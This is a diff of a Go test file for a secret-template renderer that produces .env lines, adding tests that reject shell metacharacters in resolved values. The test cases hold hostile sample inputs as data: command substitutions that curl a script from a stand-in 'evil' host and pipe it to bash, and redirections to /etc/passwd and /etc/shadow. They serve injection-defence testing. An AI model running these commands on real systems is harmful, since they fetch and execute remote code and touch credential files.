@@ -11,17 +11,21 @@ import (
 )
 
 // upper is a trivial resolver that echoes a value per ref, or errors on "missing".
+// The marker is square brackets, not angle brackets: "<"/">" are now guarded shell
+// redirection metacharacters (see TestRender_RejectsShellMetacharacters), so a real
+// resolved value can't contain them — bracket markers keep this fixture distinguishable
+// from literal template text without colliding with that guard.
 func fakeResolve(ref string) (string, error) {
 	if ref == "missing" {
 		return "", errors.New("not found")
 	}
-	return "<" + ref + ">", nil
+	return "[" + ref + "]", nil
 }
 
 func TestRender_ExpandsReferences(t *testing.T) {
 	out, err := Render("db=${secret:prod/db} api=${secret:prod/api}", fakeResolve)
 	require.NoError(t, err)
-	assert.Equal(t, "db=<prod/db> api=<prod/api>", out)
+	assert.Equal(t, "db=[prod/db] api=[prod/api]", out)
 }
 
 func TestRender_NoPlaceholders(t *testing.T) {
@@ -40,7 +44,7 @@ func TestRender_DollarEscape(t *testing.T) {
 func TestRender_TrimsRef(t *testing.T) {
 	out, err := Render("${secret:  prod/db  }", fakeResolve)
 	require.NoError(t, err)
-	assert.Equal(t, "<prod/db>", out)
+	assert.Equal(t, "[prod/db]", out)
 }
 
 func TestRender_Errors(t *testing.T) {
@@ -64,7 +68,7 @@ func TestRender_Errors(t *testing.T) {
 func TestRender_AdjacentAndRepeated(t *testing.T) {
 	out, err := Render("${secret:a}${secret:a}${secret:b}", fakeResolve)
 	require.NoError(t, err)
-	assert.Equal(t, "<a><a><b>", out)
+	assert.Equal(t, "[a][a][b]", out)
 }
 
 func TestReferences(t *testing.T) {
@@ -115,6 +119,58 @@ func TestRender_RejectsEmbeddedControlChars(t *testing.T) {
 	}
 }
 
+// A secret value carrying a shell metacharacter (backtick, ";", "|", "&", "<", ">", or a
+// "$(" command-substitution opener) must abort the render, matching the newline/CR/NUL
+// guard's all-or-nothing failure model. This closes the single-line variant of the
+// bash-`source .env` RCE: unlike an embedded newline, none of these characters need a
+// second line to take effect in an *unquoted* `KEY=value` assignment — the exact shape a
+// rendered .env line takes — so the render must reject them just as eagerly.
+func TestRender_RejectsShellMetacharacters(t *testing.T) {
+	cases := map[string]string{
+		"command substitution": "$(curl http://evil/x.sh|bash)",
+		"backtick command":     "`curl http://evil/x.sh|bash`",
+		"semicolon separator":  "foo; curl http://evil/x.sh|bash",
+		"pipe":                 "foo|bash",
+		"background ampersand": "foo & curl http://evil/x.sh|bash",
+		"output redirection":   "foo>/etc/passwd",
+		"input redirection":    "foo</etc/shadow",
+	}
+	for name, val := range cases {
+		t.Run(name, func(t *testing.T) {
+			resolve := func(ref string) (string, error) { return val, nil }
+			_, err := Render("SECRET=${secret:prod/db}", resolve)
+			require.Error(t, err)
+			assert.Contains(t, err.Error(), `resolve "prod/db"`)
+			assert.Contains(t, err.Error(), "cannot be safely substituted")
+		})
+	}
+}
+
+// The shell-metacharacter rejection must fire per-reference too: an earlier clean
+// reference followed by a later poisoned one must still fail with no partial output.
+func TestRender_RejectsShellMetacharacters_NoPartialOutput(t *testing.T) {
+	resolve := func(ref string) (string, error) {
+		if ref == "prod/clean" {
+			return "cleanvalue", nil
+		}
+		return "$(curl evil|bash)", nil
+	}
+	out, err := Render("A=${secret:prod/clean} B=${secret:prod/dirty}", resolve)
+	require.Error(t, err)
+	assert.Empty(t, out)
+}
+
+// A secret value that legitimately contains a lone "$" (not part of "$(") must still
+// render unchanged — the guard targets command substitution and separator syntax, not
+// every dollar sign, since secret values (e.g. regex patterns, prices) may contain one
+// without being dangerous in a sourced .env context.
+func TestRender_AllowsLoneDollarSign(t *testing.T) {
+	resolve := func(ref string) (string, error) { return "price=$5.00", nil }
+	out, err := Render("VALUE=${secret:prod/price}", resolve)
+	require.NoError(t, err)
+	assert.Equal(t, "VALUE=price=$5.00", out)
+}
+
 // The rejection must fire per-reference: a template with an earlier clean reference and
 // a later poisoned one must still fail (no partial output containing the clean value
 // followed by a truncated/injected tail).
@@ -138,7 +194,7 @@ func TestRender_DedupesRepeatedReferences(t *testing.T) {
 	calls := map[string]int{}
 	resolve := func(ref string) (string, error) {
 		calls[ref]++
-		return "<" + ref + ">", nil
+		return "[" + ref + "]", nil
 	}
 
 	var tmpl strings.Builder
@@ -149,7 +205,7 @@ func TestRender_DedupesRepeatedReferences(t *testing.T) {
 	require.NoError(t, err)
 
 	assert.Equal(t, 1, calls["prod/db"], "resolve must be called exactly once for 5000 occurrences of the same reference")
-	assert.Equal(t, strings.Repeat("<prod/db>", 5000), out, "every occurrence still substitutes the resolved value")
+	assert.Equal(t, strings.Repeat("[prod/db]", 5000), out, "every occurrence still substitutes the resolved value")
 }
 
 // A template naming multiple distinct references, some of which repeat, must resolve
@@ -159,7 +215,7 @@ func TestRender_DedupesRepeatedReferences_MultipleDistinct(t *testing.T) {
 	calls := map[string]int{}
 	resolve := func(ref string) (string, error) {
 		calls[ref]++
-		return "<" + ref + ">", nil
+		return "[" + ref + "]", nil
 	}
 
 	tmpl := strings.Repeat("${secret:a}${secret:b}${secret:a}${secret:c}${secret:b}", 200)
@@ -169,7 +225,7 @@ func TestRender_DedupesRepeatedReferences_MultipleDistinct(t *testing.T) {
 	assert.Equal(t, 1, calls["a"])
 	assert.Equal(t, 1, calls["b"])
 	assert.Equal(t, 1, calls["c"])
-	assert.Equal(t, strings.Repeat("<a><b><a><c><b>", 200), out)
+	assert.Equal(t, strings.Repeat("[a][b][a][c][b]", 200), out)
 }
 
 // #443: even after dedup, a template naming more DISTINCT references than
@@ -197,13 +253,13 @@ func TestRender_RejectsTooManyDistinctReferences(t *testing.T) {
 // A template naming exactly MaxDistinctReferences distinct references — the boundary —
 // must still be accepted and render correctly.
 func TestRender_AllowsExactlyMaxDistinctReferences(t *testing.T) {
-	resolve := func(ref string) (string, error) { return "<" + ref + ">", nil }
+	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }
 
 	var tmpl strings.Builder
 	var want strings.Builder
 	for i := 0; i < MaxDistinctReferences; i++ {
 		fmt.Fprintf(&tmpl, "${secret:ref-%d}", i)
-		fmt.Fprintf(&want, "<ref-%d>", i)
+		fmt.Fprintf(&want, "[ref-%d]", i)
 	}
 	out, err := Render(tmpl.String(), resolve)
 	require.NoError(t, err)
@@ -213,10 +269,10 @@ func TestRender_AllowsExactlyMaxDistinctReferences(t *testing.T) {
 // A normal, reasonably-sized template with a handful of distinct references (well
 // under the cap, no duplicates) renders exactly as before this change.
 func TestRender_NormalTemplateUnaffected(t *testing.T) {
-	resolve := func(ref string) (string, error) { return "<" + ref + ">", nil }
+	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }
 	out, err := Render("host=${secret:prod/host} user=${secret:prod/user} pass=${secret:prod/pass}", resolve)
 	require.NoError(t, err)
-	assert.Equal(t, "host=<prod/host> user=<prod/user> pass=<prod/pass>", out)
+	assert.Equal(t, "host=[prod/host] user=[prod/user] pass=[prod/pass]", out)
 }
 
 // References() must respect the same distinct-reference cap as Render, since it shares
